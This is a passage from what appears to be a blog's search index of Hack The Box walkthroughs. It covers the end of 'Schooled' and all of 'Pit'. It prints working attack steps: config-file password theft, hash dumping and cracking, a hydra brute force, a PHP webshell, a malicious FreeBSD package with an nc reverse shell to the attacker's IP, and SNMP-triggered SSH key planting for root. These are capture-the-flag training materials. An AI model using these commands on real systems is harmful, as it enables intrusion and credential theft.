password in file `/usr/local/www/apache24/data/moodle/config.php` :   $CFG-&gt;dbtype    = 'mysqli'; $CFG-&gt;dbhost    = 'localhost'; $CFG-&gt;dbuser    = 'moodle'; $CFG-&gt;dbpass    = 'PlaybookMaster2020'; 'dbport' =&gt; 3306,   Later I have found that we were only missing some paths in PATH finding curl installed. This was also needed to find mysql binary to dump the database credentials, as command line below, which was required once I wasn’t in an interactive tty   $ find / -type f 2&gt;/dev/null | grep -e \"wget$\" -e \"curl$\" -e \"mysql$\" /usr/local/bin/curl /usr/local/bin/mysql /usr/local/share/bash-completion/completions/wget /usr/local/share/bash-completion/completions/curl /usr/local/share/bash-completion/completions/mysql /usr/local/share/zsh/site-functions/_curl /var/mail/mysql   Dumping the creds was possible with the command below:   $ /usr/local/bin/mysql -u moodle --password=PlaybookMaster2020 -e \"use moodle; select email,username,password from mdl_user; exit\" | grep -v 'student.' mysql: [Warning] Using a password on the command line interface can be insecure. ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'exit' at line 1 email   username        password root@localhost  guest   $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 jamie@staff.schooled.htb        admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW higgins_jane@staff.schooled.htb higgins_jane    $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 phillips_manuel@staff.schooled.htb      phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG carter_lianne@staff.schooled.htb        carter_lianne   $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe   Based on the hashes, created a file in the format username:hash and then ran john, where was obtained the password for account jamie as below   $ john --wordlist=/usr/share/wordlists/rockyou.txt accounts.txt                                                                 Using default input encoding: UTF-8 Loaded 5 password hashes with 5 different salts (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status !QAZ2wsx         (jamie) Use the \"--show\" option to display all of the cracked passwords reliably Session aborted   With these creds, connected through SSH and obtained the user.txt flag :smile:   jamie@Schooled:~ $ id &amp;&amp; hostname &amp;&amp; cat user.txt uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel) Schooled &lt;redacted&gt;   Root Flag   Starting the enumeration for the root flag, the first command executed was sudo -l as usual, which displayed the commands below   jamie@Schooled:~ $ sudo -l User jamie may run the following commands on Schooled:     (ALL) NOPASSWD: /usr/sbin/pkg update     (ALL) NOPASSWD: /usr/sbin/pkg install *   Checking the GTFOBins page for pkg found that we might be able to install a crafted package to run a command. The below steps were used to obtain a reverse shell as root      Installed fpm, also available from this Github Repository   sudo apt-get install ruby ruby-dev rubygems build-essential sudo gem install --no-document fpm      Created a package containing the malicious payload from the attacker machine   TF=$(mktemp -d) echo 'export file=\"/tmp/zurc\"' &gt; $TF/x.sh echo 'rm $file;mkfifo $file;cat $file|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;$file' &gt;&gt; $TF/x.sh fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF      Download package and install using sudo based on jamie’s permissions   jamie@Schooled:/tmp $ /usr/local/bin/curl http://10.10.10.10/x-1.0.txz -o x-1.0.txz 1.0.txz  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                   Dload  Upload   Total   Spent    Left  Speed 100   572  100   572    0     0   4144      0 --:--:-- --:--:-- --:--:--  4144 jamie@Schooled:/tmp $ sudo pkg install -y --no-repo-update ./x-1.0.txz pkg: Repository FreeBSD has a wrong packagesite, need to re-create database pkg: Repository FreeBSD cannot be opened. 'pkg update' required Checking integrity... done (0 conflicting) The following 1 package(s) will be affected (of 0 checked):  New packages to be INSTALLED:         x: 1.0  Number of packages to be installed: 1 [1/1] Installing x-1.0... rm: /tmp/zurc: No such file or directory   $ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.234] 16349 # cd /root # cat root.txt &lt;redacted&gt;   I hope you guys have enjoyed it!   See you at the next post :smile:  ","categories": ["Walkthrough"],
        "tags": ["HTB Linux","HTB Medium","HackTheBox"],
        "url": "/walkthrough/2021/09/htb-schooled",
        "teaser": "https://i.imgur.com/ksBoJIQ.png"
      },{
        "title": "Walktrough: HTB Pit",
        "excerpt":"Hello guys!   This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      This box was pretty different from the others as required some UDP enumeration, not often necessary but always useful when you’re at a dead-end :smile:. SNMP was key to enumerating and privesc this box, which had greater complexity once had SELinux enabled and didn’t allow an interactive shell until we get valid credentials to the system, connect via SSH and escalate privileges.   Enumeration   As usual, started by running a nmap quick scan to see which services are currently published   $ nmap -sC -sV -Pn -oA quick 10.10.10.241 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.                                 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 12:15 -03 Nmap scan report for 10.10.10.241 Host is up (0.12s latency). Not shown: 997 filtered ports PORT     STATE SERVICE         VERSION 22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: |   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA) |   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA) |_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519) 80/tcp   open  http            nginx 1.14.1 |_http-server-header: nginx/1.14.1 |_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux 9090/tcp open  ssl/zeus-admin? | fingerprint-strings: |   GetRequest, HTTPOptions: |     HTTP/1.1 400 Bad request |     Content-Type: text/html; charset=utf8 |     Transfer-Encoding: chunked |     X-DNS-Prefetch-Control: off |     Referrer-Policy: no-referrer |     X-Content-Type-Options: nosniff |     Cross-Origin-Resource-Policy: same-origin |     &lt;!DOCTYPE html&gt; |     &lt;html&gt; |     &lt;head&gt; |     &lt;title&gt; |     request |     &lt;/title&gt; |     &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt; |     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; |     &lt;style&gt; |     body { |     margin: 0; |     font-family: \"RedHatDisplay\", \"Open Sans\", Helvetica, Arial, sans-serif; |     font-size: 12px; |     line-height: 1.66666667; |     color: #333333; |     background-color: #f5f5f5; |     border: 0; |     vertical-align: middle; |     font-weight: 300; |_    margin: 0 0 10p | ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US | Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1 | Not valid before: 2020-04-16T23:29:12 |_Not valid after:  2030-06-04T16:09:12 |_ssl-date: TLS randomness does not represent time 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9090-TCP:V=7.91%T=SSL%I=7%D=8/10%Time=61129849%P=x86_64-pc-linux-gn SF:u%r(GetRequest,E70,\"HTTP/1\\.1\\x20400\\x20Bad\\x20request\\r\\nContent-Type: SF:\\x20text/html;\\x20charset=utf8\\r\\nTransfer-Encoding:\\x20chunked\\r\\nX-DN SF:S-Prefetch-Control:\\x20off\\r\\nReferrer-Policy:\\x20no-referrer\\r\\nX-Cont SF:ent-Type-Options:\\x20nosniff\\r\\nCross-Origin-Resource-Policy:\\x20same-o SF:rigin\\r\\n\\r\\n29\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20 SF:&lt;title&gt;\\r\\nb\\r\\nBad\\x20request\\r\\nd08\\r\\n&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;met SF:a\\x20http-equiv=\\\"Content-Type\\\"\\x20content=\\\"text/html;\\x20charset=utf SF:-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=de SF:vice-width,\\x20initial-scale=1\\.0\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;style&gt;\\n\\tbody\\x SF:20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20margin:\\x200;\\n\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-family:\\x20\\\"RedHatDi SF:splay\\\",\\x20\\\"Open\\x20Sans\\\",\\x20Helvetica,\\x20Arial,\\x20sans-serif;\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-size:\\x2012px;\\n\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20line-height:\\x201\\.6666666 SF:7;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20color:\\x20#333333;\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20background-color:\\x20# SF:f5f5f5;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20img\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20border:\\ SF:x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20vertical-align:\\ SF:x20middle;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20h1\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-w SF:eight:\\x20300;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20p\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20mar SF:gin:\\x200\\x200\\x2010p\")%r(HTTPOptions,E70,\"HTTP/1\\.1\\x20400\\x20Bad\\x20r SF:equest\\r\\nContent-Type:\\x20text/html;\\x20charset=utf8\\r\\nTransfer-Encod SF:ing:\\x20chunked\\r\\nX-DNS-Prefetch-Control:\\x20off\\r\\nReferrer-Policy:\\x SF:20no-referrer\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nCross-Origin-Res SF:ource-Policy:\\x20same-origin\\r\\n\\r\\n29\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n&lt; SF:head&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;\\r\\nb\\r\\nBad\\x20request\\r\\nd08\\r\\n&lt;/title SF:&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\\"Content-Type\\\"\\x20content=\\\"te SF:xt/html;\\x20charset=utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewport\\ SF:\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\.0\\\"&gt;\\n\\x20\\x20\\x SF:20\\x20&lt;style&gt;\\n\\tbody\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20margin:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20fon SF:t-family:\\x20\\\"RedHatDisplay\\\",\\x20\\\"Open\\x20Sans\\\",\\x20Helvetica,\\x20A SF:rial,\\x20sans-serif;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20f SF:ont-size:\\x2012px;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20lin SF:e-height:\\x201\\.66666667;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20color:\\x20#333333;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0background-color:\\x20#f5f5f5;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20img\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20border:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20vertical-align:\\x20middle;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20h1\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20font-weight:\\x20300;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:}\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20p\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20margin:\\x200\\x200\\x2010p\");  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 213.97 seconds   Based on the information seen in the scan, noticed that the SSL certificate for this machine is dms-pit.htb, which was later added to the local hosts file.   80/TCP and 9090/TCP - HTTP Services   Accessing the pages, we can see, for http://10.10.10.241:80 the default nginx page while the https://10.10.10.241:9090 displays a Cockpit Project — Cockpit Project (cockpit-project.org) Login Page.      Cockpit is a web-based administration interface for Linux Servers and, as the box’s name is part of the name of this solution, we might be on the right path :smile: .   Checking for vulnerabilities for this product, I have found an SSRF vulnerability in version 234 in searchsploit that we may be able to use once it doesn’t require any valid credentials.   $ searchsploit cockpit ---------------------------------------------------------------------- ----------------------------  Exploit Title                                                        |  Path ---------------------------------------------------------------------- ---------------------------- Cockpit CMS 0.4.4 &lt; 0.5.5 - Server-Side Request Forgery               | php/webapps/44567.txt Cockpit CMS 0.6.1 - Remote Code Execution                             | php/webapps/49390.txt Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)   | multiple/webapps/49397.txt openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                    | php/webapps/47305.py ---------------------------------------------------------------------- ---------------------------- Shellcodes: No Results  $ head $(locate  multiple/webapps/49397.txt) # Exploit Title: Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated) # Date: 08.01.2021 # Exploit Author: Metin Yunus Kandemir # Vendor Homepage: https://cockpit-project.org/ # Version: v234 # Tested on: Ubuntu 18.04  #!/usr/bin/python3 import argparse import requests   Reading about this vulnerability on this Github page we can use this to enumerate and access contents we might not be allowed from other hosts, which could be useful later but, at this moment, won’t help much.   Proceeding with the enumeration, now using whatweb to speed things a little, I have created a simple bash script to loop to each host and port available, giving us some idea of what we might have published in this system   #!/bin/bash declare -a hosts=(\"10.10.10.241\" \"pit.htb\" \"dms-pit.htb\"); declare -a ports=(\"80\" \"9090\");  for host in \"${hosts[@]}\"; do         for port in \"${ports[@]}\"; do                 whatweb --color=never -a 3 \"$host:$port\" &gt;&gt; whatweb_enum.txt         done done   Inspecting the results, found something interesting: when we call the domain dms-pit.htb we get a 403 Forbidden response, the ideal scenario to leverage the SSRF vuln in Cockpit, if present :smile:   http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]   Making some tests based on the PoC Seen, noticed that the “Connect to” field mentioned isn’t available. Also, checking the PoC videos, noticed that the version we’re running is updated and no longer vulnerable, also confirmed issuing some requests to /cockpit and don’t succeeding :disappointed:.   Based on that, started to enumerate again, both running a nmap scan for all TCP ports and quick UDP scan as well, to check if we’re missing something here. Also started a gobuster enumeration on http://10.10.10.241 to check for any published website on it.   After some time waiting, gobuster unfortunately resulted in nothing, as well as TCP for all ports, not showing anything different than we already saw in the quick scan. Surprisingly the UDP scan displayed listed two open ports, as results below:   $ sudo nmap -sU -sV -vv -oA quick_udp 10.10.10.241 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 13:53 -03 NSE: Loaded 45 scripts for scanning. Initiating Ping Scan at 13:53 Scanning 10.10.10.241 [4 ports] Completed Ping Scan at 13:53, 0.10s elapsed (1 total hosts) Initiating UDP Scan at 13:53 Increasing send delay for 10.10.10.241 from 800 to 1000 due to 37 out of 121 dropped probes since last increase. Warning: 10.10.10.241 giving up on port because retransmission cap hit (10). Nmap scan report for dms-pit.htb (10.10.10.241) Host is up, received echo-reply ttl 63 (0.16s latency). Scanned at 2021-08-10 13:53:34 -03 for 1081s Not shown: 998 filtered ports Reason: 979 admin-prohibiteds and 19 host-unreaches PORT      STATE         SERVICE REASON       VERSION 161/udp   open          snmp    udp-response SNMPv1 server; net-snmp SNMPv3 server (public) 20762/udp open|filtered unknown no-response Service Info: Host: pit.htb  Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .   161/UDP - SNMP Service   Starting with the SNMP Service, ran snmp-check and obtained some information from the system and running processes but with a simple run couldn’t obtain much information that could lead us further like passwords, secrets, etc.   snmp-check 10.10.10.241   Using another tool, snmpwalk, as recommended in this page, noticed that this tool can enumerate identifiers and specific OIDs (Object Identifiers) but, with the provided information not much data was also retrieved, allowing us to enumerate the accounts in the system, among other information (as well as the processes previously listed.)   NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\"monitoring\" = STRING: Memory usage               total        used        free      shared  buff/cache   available Mem:          3.8Gi       345Mi       3.1Gi       8.0Mi       452Mi       3.2Gi Swap:         1.9Gi          0B       1.9Gi Database status OK - Connection to database successful. System release info CentOS Linux release 8.3.2011 SELinux Settings user                  Labeling   MLS/       MLS/ SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles  guest_u         user       s0         s0                             guest_r root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r user_u          user       s0         s0                             user_r xguest_u        user       s0         s0                             xguest_r login  Login Name           SELinux User         MLS/MCS Range        Service  __default__          unconfined_u         s0-s0:c0.c1023       * michelle             user_u               s0                   * root                 unconfined_u         s0-s0:c0.c1023       * System uptime  13:33:08 up 37 min,  0 users,  load average: 0.19, 0.10, 0.18   Searching for other opportunities to enumerate SNMP devices, came across this page SNMP:Comandos – snmpwalk – LRodrigo – Web Site (lncc.br) talking about some commands also using snmpwalk. The interesting here is that if you specify the OID until certain point, it lists all information about it, as SNMP works like a tree like the image below, extracted from Wikimedia.org:      Once the root (in red on the image) doesn’t change, decided to run snmpwalk once again, but specifying from where I wanted to inspect, which was right from the root (.1) and then filtered the empty values, using the command below”   snmpwalk -v 1 -c public 10.10.10.241  .1 | grep -v -e \"\\\"\\\"$\"   Things got interesting when reviewing the output where, right after the process’s lists, an OID .1.3.6.1.4.1.2021 was displaying some nginx information, previously unseen based on previous enumerations, one of them mentioning the path /var/www/html/seeddms51x/seeddms   iso.3.6.1.4.1.2021.2.1.1.1 = INTEGER: 1 iso.3.6.1.4.1.2021.2.1.2.1 = STRING: \"nginx\" iso.3.6.1.4.1.2021.2.1.3.1 = INTEGER: 1 iso.3.6.1.4.1.2021.2.1.4.1 = INTEGER: 0 iso.3.6.1.4.1.2021.2.1.5.1 = INTEGER: 3 iso.3.6.1.4.1.2021.2.1.100.1 = INTEGER: 0 iso.3.6.1.4.1.2021.2.1.102.1 = INTEGER: 0 iso.3.6.1.4.1.2021.9.1.1.1 = INTEGER: 1 iso.3.6.1.4.1.2021.9.1.1.2 = INTEGER: 2 iso.3.6.1.4.1.2021.9.1.2.1 = STRING: \"/\" iso.3.6.1.4.1.2021.9.1.2.2 = STRING: \"/var/www/html/seeddms51x/seeddms\" iso.3.6.1.4.1.2021.9.1.3.1 = STRING: \"/dev/mapper/cl-root\" iso.3.6.1.4.1.2021.9.1.3.2 = STRING: \"/dev/mapper/cl-seeddms\" iso.3.6.1.4.1.2021.9.1.4.1 = INTEGER: 10000 iso.3.6.1.4.1.2021.9.1.4.2 = INTEGER: 100000 iso.3.6.1.4.1.2021.9.1.5.1 = INTEGER: -1 iso.3.6.1.4.1.2021.9.1.5.2 = INTEGER: -1 iso.3.6.1.4.1.2021.9.1.6.1 = INTEGER: 2611200 iso.3.6.1.4.1.2021.9.1.6.2 = INTEGER: 125600 iso.3.6.1.4.1.2021.9.1.7.1 = INTEGER: 374736   Switched back to browser and navigated to all domains appending the path we have found, and the SeedDMS portal was accessible via http://dms-pit.htb/seeddms51x/seeddms as we can see below      Initial access   Giving a quick check in searchsploit found some existing exploits for this app but all of them requires us to be authenticated to work.   $ searchsploit seeddms ---------------------------------------------------------------------- ----------------------------  Exploit Title                                                        |  Path ---------------------------------------------------------------------- ---------------------------- Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)       | php/webapps/50062.py SeedDMS 5.1.18 - Persistent Cross-Site Scripting                      | php/webapps/48324.txt SeedDMS &lt; 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting            | php/webapps/47024.txt SeedDMS &lt; 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting              | php/webapps/47023.txt SeedDMS versions &lt; 5.1.11 - Remote Command Execution                  | php/webapps/47022.txt ---------------------------------------------------------------------- ---------------------------- Shellcodes: No Results   As we have some usernames and this is half of the answer, obtained from snmpwalk scans where michelle was found, we can try to guess or brute-force it using hydra, where we interestingly found the password as the same as the username:   $ hydra -l michelle -P /usr/share/wordlists/rockyou.txt dms-pit.htb http-post-form \"/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:Error\" -t 10 Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-10 16:05:20 [DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task [DATA] attacking http-post-form://dms-pit.htb:80/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:Error [80][http-post-form] host: dms-pit.htb   login: michelle   password: michelle 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-10 16:05:24   Now that we have access to SeedDMS, we can use it to exploit the vulnerability, which, after uploading a php document, in this case a simple webshell (&lt;?php system($_GET[\"cmd\"]); ?&gt;), we were able to execute commands using curl leveraging the Document ID of the uploaded file, in this case 31:   $ curl -X GET -G 'http://dms-pit.htb/seeddms51x/data/1048576/31/1.php' --data-urlencode 'cmd=id' uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0   User flag   Besides having now RCE machine, every reverse shell command I try fails. I have tried several ways (bash, python, external payload, etc) and none of them worked, possibly due to SELinux enabled on the box. Based on that, decided to use the webshell to enumerate the system.   Checking SeedDMS project page on GitHub, identified that there’s a /conf/settings.xml file which contains the credentials to the database, which could be reused for other users in the system.   $ curl -X GET -G 'http://dms-pit.htb/seeddms51x/data/1048576/33/1.php' --data-urlencode 'cmd=cat /var/www/html/seeddms51x/conf/settings.xml' | grep database   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100 11933    0 11933    0     0  77993      0 --:--:-- --:--:-- --:--:-- 77993     &lt;edition strictFormCheck=\"false\" viewOnlineFileTypes=\".txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg\" enableConverting=\"true\" enableEmail=\"true\" enableUsersView=\"true\" enableFullSearch=\"true\" enableClipboard=\"false\" enableFolderTree=\"true\" expandFolderTree=\"1\" enableLanguageSelector=\"true\" stopWordsFile=\"\" sortUsersInList=\"\" enableDropUpload=\"false\" enableRecursiveCount=\"false\" maxRecursiveCount=\"0\" enableThemeSelector=\"false\" fullSearchEngine=\"sqlitefts\" sortFoldersDefault=\"u\" editOnlineFileTypes=\"\" enableMenuTasks=\"false\" enableHelp=\"false\" defaultSearchMethod=\"database\" libraryFolder=\"0\" maxSizeForFullText=\"0\" showSingleSearchHit=\"false\" enableSessionList=\"false\" enableDropFolderList=\"false\" enableMultiUpload=\"false\" defaultDocPosition=\"end\"&gt;        - restricted: Restricted access: only allow users to log in if they have an entry in the local database (irrespective of successful authentication with LDAP).        - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)        - dbUser: username for database-access        - dbPass: password for database-access     &lt;database dbDriver=\"mysql\" dbHostname=\"localhost\" dbDatabase=\"seeddms\" dbUser=\"seeddms\" dbPass=\"ied^ieY6xoquu\" doNotCheckVersion=\"false\"&gt;     &lt;/database&gt;   Using mysql command line, enumerated tables, columns and then retrieved the username, pwd and role from the users in database   # List Tables $ curl -X GET -G 'http://dms-pit.htb/seeddms51x/data/1048576/30/1.php' --data-urlencode 'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e \"use seeddms; select login,pwd,role from tblUsers; exit\"' [...]  # List Columns from tblUsers $ curl -X GET -G 'http://dms-pit.htb/seeddms51x/data/1048576/34/1.php' --data-urlencode 'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e \"use seeddms; show columns from tblUsers; exit\"' [...]  # Dump credentials $ curl -X GET -G 'http://dms-pit.htb/seeddms51x/data/1048576/30/1.php' --data-urlencode 'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e \"use seeddms; select login,pwd,role from tblUsers; exit\"' login   pwd     role admin   155dd275b4cb74bd1f80754b61148863        1 guest   NULL    2 michelle        2345f10bb948c5665ef91f6773b3e455        0 jack    682d305fdaabc156430c4c6f6f5cc65d        0   With the hashes, tried to crack them using john and rockyou.txt but with no success.   As we have the database credentials, remembered that we have access to the cockpit page, where the credentials could not be validated for user seeddms but worked successfully for michelle.   Accessing the terminal from the web portal, was able to get the user.txt hash   [michelle@pit ~]$ ls  check.sh  user.txt [michelle@pit ~]$ cat user.txt &lt;redacted&gt;   Root flag   After submitting the flag, was unable to run sudo -l as usually done, so started the enumeration from michelle’s account using linpeas.sh, where nothing too interesting was found besides an uncommon file containing particular privileges.   ╔══════════╣ Files with ACLs (limited to 50) ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls # file: /usr/local/monitoring USER   root      rwx user   michelle  -wx GROUP  root      rwx mask             rwx other            ---                     Inspecting this file, noticed that’s actually a directory but we don’t have read access on (just write and execute according to above output). Searching for other files that makes reference to this folder, ran a recusive grep in the file system, where I have found a file previously found in snmpwalk enum..   [michelle@pit local]$ grep -r \"/usr/local/monitoring/\"  / 2&gt;/dev/null /usr/bin/monitor:for script in /usr/local/monitoring/check*sh [michelle@pit local]$ cat /usr/bin/monitor  #!/bin/bash  for script in /usr/local/monitoring/check*sh do     /bin/bash $script done [michelle@pit local]$   As we can see, this script runs any file with check*.sh in the directory /usr/local/monitoring, allowing us to run any arbitrary code from the process that starts /usr/bin/monitor.   To better understanding on how I could leverage the permission found, decided to review the recon output and found a mention to the file monitor, referenced as nxExtendedCommands from SNMP scan.   $ grep -r \"/usr/bin/monitor\" . ./scans/snmpwalk_nsExtendObjects.txt:NET-SNMP-EXTEND-MIB::nsExtendCommand.\"monitoring\" = STRING: /usr/bin/monitor ./scans/snmp_full.txt:iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: \"/usr/bin/monitor\"   According to this guide SNMP RCE - HackTricks, if any binary is configured as nsExtendedCommand (or you’re able to add any in these settings), you can trigger its execution using snmpwalk.   Based on the gathered information, we probably have a way to gain rootaccess, where the following steps were executed:      Created a checkXXXX.sh file, which adds a public key inside ssh’s authorized_keys in the profile that runs the process and copied it to /usr/bin/monitor.   #!/bin/bash echo \"ssh-rsa &lt;base64PubKey&gt; root@kali\" &gt;&gt; ~/.ssh/authorized_keys      From the attacker machine, triggered the nsExtendedObject action   # Trigger Extended objects snmpwalk -v 1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects      Right after that, connected using the corresponding private key via SSH as user root, where I was able to get the final flag   $ ssh -i pit root@10.10.10.241 Web console: https://pit.htb:9090/  Last login: Tue Aug 10 14:50:51 2021 from 10.10.10.10 [root@pit ~]# id &amp;&amp; hostname uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 pit.htb [root@pit ~]# cat root.txt &lt;redacted&gt; [root@pit ~]#   I hope you guys have enjoyed!   See you at the next post :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Medium","HTB Linux"],
        "url": "/walkthrough/2021/09/htb-pit",
        "teaser": "https://i.imgur.com/pUqq7fY.png"
      },{
        "title": "Walktrough: HTB Cap",
